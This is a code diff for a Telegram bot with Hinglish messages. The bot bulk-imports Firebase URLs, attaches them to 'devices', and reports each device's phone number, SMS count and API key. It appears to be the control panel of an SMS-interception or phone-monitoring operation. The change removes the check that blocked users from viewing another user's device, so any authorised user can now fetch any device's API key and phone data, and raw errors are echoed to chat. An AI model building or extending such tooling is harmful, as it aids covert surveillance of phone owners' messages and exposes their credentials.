@@ -9,13 +9,13 @@ from app.config import get_settings
 from app.database import Device, SMSMessage, SessionLocal
 from app.bulk_firebase import bulk_import_from_txt
 from app.services import (
-    claim_pool_device,
     device_status,
+    get_active_device,
     get_monitoring_user_ids,
-    list_devices_with_counts,
     register_device,
     get_monitor_profile,
     set_firebase_url,
+    show_device_by_id,
     set_user_phone,
     start_monitoring,
     stop_monitoring,
@@ -125,7 +125,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "*Firebase:*\n"
         "/setfirebase https://project.firebaseio.com\n"
         "/allfirebase - txt file bhejo bulk import ke liye\n"
-        "/a deviceid - pool se device claim karo\n\n"
+        "/a deviceid - sirf woh ek device dikhao\n\n"
         "*Device commands:*\n"
         "/a myphone - Apni device add/claim karo\n"
         "/devices - Meri devices list\n"
@@ -233,7 +233,7 @@ async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         "`deviceid`\n"
         "`deviceid|https://firebase-url.com`\n"
         "`https://firebase-url.com`\n\n"
-        "Import ke baad `/a <deviceid>` se device claim karo.",
+        "Import ke baad `/a <deviceid>` likho — sirf woh ek device dikhegi.",
         parse_mode="Markdown",
     )
 
@@ -278,7 +278,7 @@ async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFA
             pass
 
     try:
-        result = await bulk_import_from_txt(db, content, live_fetch=True, on_progress=on_progress)
+        result = await bulk_import_from_txt(db, content, live_fetch=False, on_progress=on_progress)
     except ValueError as exc:
         await status_msg.edit_text(f"❌ {exc}")
         return
@@ -290,12 +290,10 @@ async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFA
         db.close()
 
     await status_msg.edit_text(
-        f"✅ *Bulk Import Complete!*\n\n"
-        f"📄 Lines processed: *{result['lines']}*\n"
-        f"📱 Devices imported: *{result['imported']}*\n"
-        f"❌ Failed: *{result['failed']}*\n"
-        f"🗂️ Pool total: *{result['pool_total']}*\n\n"
-        f"Ab claim karo: `/a <deviceid>`",
+        f"✅ *{result['imported']} Firebase attached!*\n\n"
+        f"Ab device dekhne ke liye likho:\n"
+        f"`/a <deviceid>`\n\n"
+        f"Sirf woh ek device dikhegi — saari list nahi.",
         parse_mode="Markdown",
     )
 
@@ -345,25 +343,50 @@ async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
 
+def format_single_device(device: Device, sms_count: int) -> str:
+    status = device_status(device)
+    status_icon = {"online": "🟢", "idle": "🟡", "offline": "🔴"}.get(status, "⚪")
+    phone = f"+{device.phone_number}" if device.phone_number else "N/A"
+    firebase = f"\n🔥 Firebase: `{device.firebase_source_url}`" if device.firebase_source_url else ""
+    return (
+        f"📱 *Device*\n\n"
+        f"🆔 ID: `{device.name}`\n"
+        f"{status_icon} Status: *{status}*\n"
+        f"📞 Phone: `{phone}`\n"
+        f"📨 SMS: *{sms_count}*\n"
+        f"🔑 API key: `{device.api_key}`"
+        f"{firebase}"
+    )
+
+
 async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     if not is_authorized(user.id if user else None):
         return
 
     if not context.args:
-        pool_count = 0
         db: Session = SessionLocal()
         try:
-            pool_count = db.query(Device).filter(Device.owner_telegram_id.is_(None)).count()
+            active = get_active_device(db, user.id)
+            if active:
+                sms_count = (
+                    db.query(SMSMessage)
+                    .filter(SMSMessage.device_id == active.id)
+                    .count()
+                )
+                await update.message.reply_text(
+                    format_single_device(active, sms_count) + "\n\n"
+                    "Dusri device: `/a <deviceid>`",
+                    parse_mode="Markdown",
+                )
+                return
         finally:
             db.close()
+
         await update.message.reply_text(
             "Usage: `/a <deviceid>`\n\n"
-            "Example:\n"
-            "`/a device001`\n"
-            "`/a redmi-note-12`\n"
-            f"`/a 3`\n\n"
-            f"🗂️ Pool mein *{pool_count}* devices available hain.",
+            "Example: `/a device001`\n\n"
+            "Sirf woh ek device dikhegi.",
             parse_mode="Markdown",
         )
         return
@@ -371,7 +394,7 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     deviceid = context.args[0]
     db: Session = SessionLocal()
     try:
-        device, created = claim_pool_device(db, deviceid, user.id)
+        device, _profile = await show_device_by_id(db, deviceid, user.id)
         sms_count = (
             db.query(SMSMessage)
             .filter(SMSMessage.device_id == device.id)
@@ -379,28 +402,20 @@ async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         )
     except LookupError:
         await update.message.reply_text(
-            f"❌ Device `{deviceid}` pool mein nahi mili.\n"
+            f"❌ Device `{deviceid}` nahi mili.\n"
             f"Pehle `/allfirebase` se txt import karo.",
             parse_mode="Markdown",
         )
         return
-    except PermissionError:
-        await update.message.reply_text("❌ Ye device kisi aur user ki hai.")
+    except Exception as exc:
+        logger.error("Device lookup failed: %s", exc)
+        await update.message.reply_text(f"❌ Error: {exc}")
         return
     finally:
         db.close()
 
-    status = device_status(device)
-    status_icon = {"online": "🟢", "idle": "🟡", "offline": "🔴"}.get(status, "⚪")
-    action = "added" if created else "linked"
-
     await update.message.reply_text(
-        f"✅ Device {action}: `{device.name}`\n\n"
-        f"🆔 ID: `{device.id}`\n"
-        f"{status_icon} Status: *{status}*\n"
-        f"📨 SMS count: *{sms_count}*\n"
-        f"🔑 API key: `{device.api_key}`\n\n"
-        f"Phone webhook mein ye key use karo.",
+        format_single_device(device, sms_count),
         parse_mode="Markdown",
     )
 
@@ -412,29 +427,29 @@ async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     db: Session = SessionLocal()
     try:
-        profile = get_monitor_profile(db, user.id)
-        items = list_devices_with_counts(db, owner_telegram_id=user.id)
+        active = get_active_device(db, user.id)
+        if not active:
+            await update.message.reply_text(
+                "📭 Koi active device nahi.\n\n"
+                "Device dekhne ke liye: `/a <deviceid>`\n"
+                "Sirf woh ek device dikhegi.",
+                parse_mode="Markdown",
+            )
+            return
+
+        sms_count = (
+            db.query(SMSMessage)
+            .filter(SMSMessage.device_id == active.id)
+            .count()
+        )
     finally:
         db.close()
 
-    if not items:
-        await update.message.reply_text(
-            "📭 Abhi tumhari koi device nahi hai.\n\n"
-            "Firebase: `/setfirebase <url>`\n"
-            "Manual: `/a my-phone`\n"
-            "Ya SMS forward karo, phir `/a deviceid` se claim karo.",
-            parse_mode="Markdown",
-        )
-        return
-
-    header = "📱 *Meri Devices*"
-    if profile and profile.firebase_url:
-        header += f"\n🔥 Firebase: `{profile.firebase_url}`"
-    lines = [header + "\n"]
-    for item in items:
-        lines.append(format_device_line(item["device"], item["sms_count"]))
-
-    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
+    await update.message.reply_text(
+        format_single_device(active, sms_count) + "\n\n"
+        "Dusri device khojne ke liye: `/a <deviceid>`",
+        parse_mode="Markdown",
+    )
 
 
 async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
